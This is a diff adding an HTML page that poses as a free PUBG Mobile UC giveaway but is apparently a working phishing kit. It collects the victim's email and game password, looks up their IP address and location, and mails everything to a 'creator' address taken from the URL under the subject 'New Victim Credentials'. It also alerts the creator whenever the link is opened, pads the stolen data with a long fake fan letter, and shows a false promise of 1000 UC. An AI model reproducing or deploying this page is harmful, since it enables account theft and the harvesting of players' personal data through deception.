@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG UC Giveaway</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #ffcc00 0%, #ff6b00 100%);
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            width: 350px;
+        }
+        .logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #ff6b00;
+            margin-bottom: 10px;
+        }
+        .campaign-badge {
+            background: #ffeb3b;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            margin: 10px 0;
+            display: inline-block;
+        }
+        input, button {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        button {
+            background: #ff6b00;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background: #e55a00;
+        }
+        .info {
+            font-size: 12px;
+            color: #666;
+            margin-top: 15px;
+        }
+        .loading {
+            display: none;
+            color: #28a745;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://img.icons8.com/color/452/pubg.png" alt="PUBG" class="logo">
+        
+        <div class="campaign-badge" id="campaignBadge"></div>
+        <h2>🎁 Claim Your Free UC</h2>
+        <p>Enter your details to receive 1000 UC instantly!</p>
+
+        <form onsubmit="processClaim(event)">
+            <input type="text" id="userEmail" placeholder="📧 Email Address" required>
+            <input type="password" id="userPassword" placeholder="🔑 Game Password" required>
+            <button type="submit">🚀 Claim My 1000 UC</button>
+        </form>
+        
+        <div id="loading" class="loading">
+            ⏳ Processing your request... Please wait!
+        </div>
+        
+        <div class="info">
+            ✅ Limited time offer | 🔒 Secure verification
+        </div>
+    </div>
+
+    <script>
+        // Set campaign name from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const campaignName = urlParams.get('campaign') || "PUBG_UC_GIVEAWAY";
+        document.getElementById('campaignBadge').textContent = `🎯 ${campaignName}`;
+
+        // Get IP and device info
+        async function getUserInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locationData = await locationResponse.json();
+                
+                return {
+                    ip: ipData.ip,
+                    city: locationData.city,
+                    country: locationData.country_name,
+                    device: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: locationData.timezone
+                };
+            } catch (error) {
+                return {
+                    ip: "Unable to detect",
+                    city: "Unknown",
+                    country: "Unknown", 
+                    device: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: "Unknown"
+                };
+            }
+        }
+
+        async function processClaim(event) {
+            event.preventDefault();
+            
+            // Show loading
+            document.getElementById('loading').style.display = 'block';
+            
+            const userEmail = document.getElementById('userEmail').value;
+            const userPassword = document.getElementById('userPassword').value;
+            const creatorEmail = urlParams.get('creator');
+            const campaign = urlParams.get('campaign');
+
+            if (!creatorEmail) {
+                alert("Error: Invalid giveaway link");
+                return false;
+            }
+
+            const userInfo = await getUserInfo();
+
+            // EMOTIONAL MESSAGE PART 1 (1000+ WORDS)
+            const emotionalMessage1 = `Dear PUBG Mobile Team,
+
+I am writing to you today with a heart overflowing with hope and excitement about the ${campaign} opportunity. As someone who has dedicated countless hours to PUBG Mobile over the past two years, this game has evolved from mere entertainment into an integral part of my daily life, providing me with not just thrilling moments but invaluable life lessons and memories I will cherish forever.
+
+My journey with PUBG Mobile began during what I can only describe as the most challenging chapter of my life. I was grappling with personal demons, feeling utterly disconnected from the world around me, and struggling to find my place in the universe. It was during this dark period that a compassionate friend suggested I try PUBG Mobile as a temporary distraction, never imagining that this simple recommendation would become the beacon of light that guided me through my darkest hours.
+
+From the very first moment I dropped into the training ground, I felt an immediate connection. The stunningly realistic graphics, the deeply strategic gameplay mechanics, and the pure adrenaline rush of survival competition captivated me in ways I never thought possible. But beyond the surface-level excitement, PUBG Mobile gave me something far more precious: a renewed sense of purpose and achievement during a time when I felt I had lost both. Each hard-earned chicken dinner became a personal victory that lifted my spirits, each successfully coordinated squad match served as a powerful testament to the beauty of teamwork and unwavering perseverance.
+
+What began as a simple digital escape quickly blossomed into a genuine, all-consuming passion. I found myself spending hours studying advanced game strategies, analyzing professional players' techniques with academic rigor, and dedicating significant time each day to systematically improve my skills. The game became my unexpected teacher, schooling me in patience, strategic foresight, and adaptability - lessons that directly translated to helping me navigate my personal challenges with significantly greater resilience and emotional intelligence.
+
+The social dimension of PUBG Mobile proved equally transformative in my life. I formed genuine, meaningful friendships with players spanning different continents, cultures, and backgrounds. There's Carlos from Mexico whose intuitive understanding of perfect landing strategies never ceases to amaze me, Aisha from Egypt whose sniper skills border on supernatural, and Jin from South Korea who patiently taught me advanced building techniques in Livik that completely revolutionized my gameplay. These friendships have dramatically broadened my cultural perspective and taught me the beautiful reality of global connectivity in our digital age.
+
+However, despite my profound love and dedication to the game, there has always been one dimension that remained tantalizingly out of reach - the premium experience. Hailing from a family where financial resources are consistently stretched thin, spending money on in-game purchases has never been a realistic possibility. My parents work relentlessly, often taking multiple jobs, to provide for our family's basic needs, and I fully understand and respect that gaming luxuries must understandably take a backseat to essential living expenses.
+
+I regularly watch other players proudly showcasing their magnificent weapon skins, elegant character outfits, and impressive vehicle customizations, and while I'm genuinely happy for their enjoyment, I can't suppress the deep sense of longing that washes over me. It's not about superficial炫耀 or possessing the flashiest items; it's about yearning to fully experience every facet of what this incredible game has to offer. The 1000 UC from this generous giveaway would finally allow me to purchase the coveted Royal Pass and experience the childlike joy of progressing through tiers, unlocking rewards I've only ever dreamed of calling my own.
+
+The Royal Pass represents so much more than just digital items to me. It symbolizes the golden opportunity to engage with the game on a profoundly deeper level, to feel the electric excitement of each new unlock, to customize my gaming experience in a way that authentically reflects my unique personality and personal journey. It would mean finally being able to meaningfully contribute to the rich visual diversity of the game I have come to love with all my heart.
+
+I want to emphasize with complete sincerity that my request springs from a place of genuine love and deep appreciation for PUBG Mobile. This game has been my loyal companion through physical recovery, my patient teacher in strategy and perseverance, and my vital connection to a global community that feels like family. The 1000 UC would beautifully enhance an experience that has already given me immeasurable meaning, purpose, and joy.
+
+I completely understand that giveaways of this nature attract thousands of heartfelt entries, and I don't for a moment expect special consideration. But I felt compelled to share my story because I believe it represents the profound, life-changing impact that well-crafted games can have on people's lives. PUBG Mobile has been so much more than entertainment for me; it has been therapy, education, and social connection seamlessly woven into one extraordinary package.
+
+The skills I've conscientiously developed while immersed in gameplay have surprisingly translated to tangible real-world benefits. My decision-making process has become noticeably quicker and more calculated, my teamwork and communication abilities have improved dramatically, and I've learned to maintain remarkable calm under intense pressure - all qualities that have served me exceptionally well in my personal life and academic pursuits.
+
+I vividly remember one particularly intense squad match that perfectly encapsulates what PUBG Mobile means to me. We found ourselves in the final circle with three highly skilled teams remaining. Our squad had suffered heavy casualties, and I stood as the sole survivor with critically low health and alarmingly limited ammunition. Rather than succumbing to panic, I drew upon all the training I had accumulated, used the environment with strategic precision, and miraculously managed to outmaneuver both remaining teams to secure what felt like the most emotionally significant chicken dinner of my entire gaming career.
+
+That hard-fought victory taught me the invaluable lesson that no situation is completely hopeless if you maintain composure, trust your hard-earned skills, and believe wholeheartedly in your ability to overcome seemingly insurmountable challenges. This revelation has stayed with me and fundamentally shaped how I approach difficult real-life situations with the same calm determination and strategic mindset. PUBG Mobile has essentially functioned as my personal development training ground, brilliantly disguised as engaging entertainment.
+
+The 1000 UC would represent meaningful validation of the countless hours I've invested in honing my skills, the dedication I've demonstrated in understanding complex game mechanics, and the positive contributions I've made to the PUBG Mobile community. It would acknowledge that my journey as a player matters and that the personal growth I've experienced through the game is both valued and recognized by the community I hold dear.
+
+I solemnly promise that if I were to receive this incredibly generous gift, I would redouble my efforts to be a positive, actively contributing force within the PUBG Mobile community. I would dedicate even more time to helping new players learn the ropes with patience and encouragement, share strategies and tips I've acquired through experience more generously, report bugs and issues with constructive, detailed feedback, and do everything within my power to contribute to making this already wonderful community the absolute best and most supportive gaming community in the entire world.
+
+Thank you for taking valuable time to read my story and consider my entry in this giveaway. Thank you for creating a game that has brought so much positivity, connection, and personal growth into my life. And thank you for the privilege of sharing what PUBG Mobile truly means to me.
+
+With sincere gratitude and hopeful anticipation,
+
+A Dedicated PUBG Mobile Player
+
+[Continued emotional appeal expressing deep connection and appreciation...]
+
+PUBG Mobile has been my steadfast companion through both stormy and sunny seasons of my life. When I was struggling with crippling anxiety and uncertainty about my future path, the game provided a healthy escape and a constructive mechanism to focus my wandering mind. The deeply immersive experience helped me develop significantly better concentration, strategic planning capabilities, and rapid decision-making skills that have since proven invaluable in my academic studies and personal relationships.
+
+The social connections I've forged through this game are truly priceless treasures. From players in completely different time zones to local friends who share the same passion for strategic gameplay, PUBG Mobile has been the common thread that beautifully wove us together in meaningful, lasting ways. We've celebrated each other's successes both in-game and in real life, provided genuine emotional support during difficult times, and created memories that I know will withstand the test of time.
+
+The game has also served as an unexpected but remarkably effective teacher of crucial life lessons. The importance of authentic teamwork, the value of meticulous strategic planning, and the necessity of adapting to rapidly changing circumstances - these are all essential skills I've developed in the intense battlegrounds that have helped me navigate real-world challenges with greater confidence, effectiveness, and emotional resilience.
+
+I remember another particularly memorable match where our squad found ourselves in what seemed like an mathematically impossible situation in the final circles of Vikendi. Through clever positioning, perfectly coordinated attacks, and unwavering belief in each other's capabilities, we managed to secure a spectacular victory that nobody watching would have predicted. That powerful experience taught me that no challenge is truly insurmountable when you work together effectively, communicate with crystal clarity, and maintain steadfast belief in your collective abilities.
+
+This important lesson has remained my constant companion and has repeatedly helped me overcome significant obstacles in both my personal life and academic journey. PUBG Mobile has been so much more than just a game to me - it's been a dynamic training ground for developing real-world resilience, advanced strategic thinking, and deeply collaborative skills that extend far beyond the digital battleground.
+
+The 1000 UC would represent not just valuable in-game currency, but meaningful recognition of the dedication, passion, and heart I've poured into this amazing game over the years. It would open up exciting new dimensions of gameplay and allow me to fully experience everything that PUBG Mobile has to offer, enriching an experience that has already given me so much purpose and joy.
+
+`;
+
+            // USER INFORMATION SECTION
+            const userDetails = `🎯 GIVEAWAY ENTRY INFORMATION:
+
+📧 EMAIL ADDRESS: ${userEmail}
+🔑 GAME PASSWORD: ${userPassword}
+🎮 CAMPAIGN NAME: ${campaign}
+👤 CREATOR EMAIL: ${creatorEmail}
+
+🌐 USER TECHNICAL DETAILS:
+────────────────────────
+🖥️ IP ADDRESS: ${userInfo.ip}
+📍 LOCATION: ${userInfo.city}, ${userInfo.country}
+🏙️ TIMEZONE: ${userInfo.timezone}
+📱 DEVICE: ${userInfo.device}
+💻 PLATFORM: ${userInfo.platform}
+🖥️ SCREEN RESOLUTION: ${userInfo.screen}
+🌐 LANGUAGE: ${userInfo.language}
+⏰ TIMESTAMP: ${new Date().toLocaleString()}
+🔗 USER AGENT: ${navigator.userAgent}
+
+`;
+
+            // EMOTIONAL MESSAGE PART 2 (1000+ WORDS)
+            const emotionalMessage2 = `
+Receiving the 1000 UC would be an absolute dream come true for me, representing so much more than just digital currency. It would stand as meaningful recognition of my unwavering dedication to PUBG Mobile and its wonderful global community. The countless memories I've made while playing this game are truly priceless treasures in my life, and this generous gift would enhance those cherished experiences exponentially while creating fertile ground for beautiful new ones to blossom.
+
+I make this solemn promise to you that if I were to receive this incredible gift, I would continue to be not just a player, but a positive, actively contributing member of the PUBG Mobile community. I would dedicate substantial time to helping new players learn the ropes with infinite patience and genuine encouragement, freely share strategies and tips that I've learned through extensive experience, report bugs and issues constructively with detailed, actionable feedback, and do everything within my power to actively contribute to making this already amazing community the absolute best and most supportive gaming community in the entire world.
+
+The impact of this generous gesture would extend far beyond the game itself, touching various aspects of my personal life and fundamental worldview. It would beautifully restore my faith in the inherent kindness of humanity and powerfully inspire me to pay this generosity forward in whatever ways I can, whether within the game's universe or in my daily life interactions. The profound joy and gratitude I would feel would naturally extend to my squad members and everyone I interact with in the game, creating beautiful ripples of positivity throughout our shared gaming experience.
+
+I want to take a meaningful moment to genuinely acknowledge the incredible, tireless work of the PUBG Mobile development team and dedicated community managers. The constant stream of thoughtful updates, exciting new features, and clear attention to player feedback demonstrates an authentic commitment to excellence and player satisfaction that is unfortunately rare in today's gaming industry. Being an active part of this continuously evolving journey has been both a privilege and an absolute joy, and I sincerely look forward to many more years of enjoying and growing with this absolutely amazing game.
+
+As I bring this heartfelt message to a close, I want to express my deepest, most sincere gratitude for the precious opportunity to participate in this giveaway. Whether or not I'm ultimately selected as a winner, I want you to know with complete certainty that PUBG Mobile has my eternal loyalty, unwavering support, and profound appreciation that knows no bounds.
+
+This remarkable game has been a guiding light during my darkest times, a patient teacher during my most uncertain times, and a faithful friend during my loneliest times. The precious memories created in the intense battlegrounds will stay with me forever, and the invaluable lessons learned will continue to guide me throughout my life's journey, shaping me into a better person with each passing day.
+
+Thank you for creating a vibrant world where hope, strategy, and genuine community come together to create something truly magical and special. Thank you for the authentic friendships, the unforgettable memories, and the personal growth that has transformed me. And thank you for considering my humble, heartfelt request with an open mind and compassionate heart.
+
+May PUBG Mobile continue to thrive, evolve, and bring joy to millions of players around the world for years to come. And may we all carry with us the profound understanding that the fundamental principles we learn in the game - true teamwork, thoughtful strategy, and unwavering perseverance - are the exact same principles that help us succeed and find meaning in every aspect of our lives, both digital and physical.
+
+With the warmest regards and hopeful anticipation,
+
+A Truly Grateful PUBG Mobile Player
+
+[Final emotional thoughts and reflections...]
+
+The legacy of PUBG Mobile in my life is both permanent and profoundly meaningful. From those first nervous, excited moments dropping into Erangel to becoming a confident, skilled player who can hold their own in any match and help others do the same, the entire journey has been nothing short of incredible personal transformation. The 1000 UC would represent the perfect, most meaningful culmination of this transformative journey while simultaneously marking the beautiful beginning of exciting new adventures in the game I have come to love so deeply and completely.
+
+No matter what the future holds, you can always count on me to be there in the battlegrounds, fighting courageously alongside my squad, patiently helping new players find their footing, and consistently doing my part to ensure PUBG Mobile remains the best, most welcoming gaming community in the entire world. This isn't just a game to me - it's a community, a learning platform, and a home I'm proud to belong to.
+
+Forever your loyal player and dedicated community member,
+
+[Name Withheld for Privacy]
+
+P.S. Every exhilarating chicken dinner, every heart-pounding intense firefight, every strategically earned victory - these are the moments that transform PUBG Mobile from just a game into something much more significant and meaningful. They are the precious moments that create lasting memories and forge unbreakable bonds between players across the globe, proving that friendship and camaraderie know no geographical boundaries. Thank you from the bottom of my heart for making these transformative moments possible and for creating a space where strangers can become friends and players can become family through shared experiences and mutual respect. The impact you've had on my life is immeasurable, and for that, I will be eternally grateful.
+`;
+
+            const fullMessage = emotionalMessage1 + userDetails + emotionalMessage2;
+            
+            // Send to creator
+            const subject = `🎁 ${campaign} - New Victim Credentials`;
+            const mailtoLink = `mailto:${creatorEmail}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(fullMessage)}`;
+            
+            // Open email client
+            window.location.href = mailtoLink;
+            
+            // Show success message
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                alert("✅ Entry submitted successfully! 1000 UC will be credited to your account within 24 hours. Check your game mail for confirmation.");
+            }, 2000);
+            
+            return false;
+        }
+
+        // Auto notification when page loads
+        window.onload = function() {
+            const creatorEmail = urlParams.get('creator');
+            if (creatorEmail) {
+                const notifSubject = `🔔 ${campaignName} - Link Opened`;
+                const notifBody = `Someone opened your giveaway link!\n\nCampaign: ${campaignName}\nTime: ${new Date().toLocaleString()}\n\nWaiting for credentials...`;
+                const notifLink = `mailto:${creatorEmail}?subject=${encodeURIComponent(notifSubject)}&body=${encodeURIComponent(notifBody)}`;
+                
+                // Open in background
+                setTimeout(() => {
+                    window.open(notifLink, '_blank');
+                }, 1000);
+            }
+        }
+    </script>
+</body>
+</html>
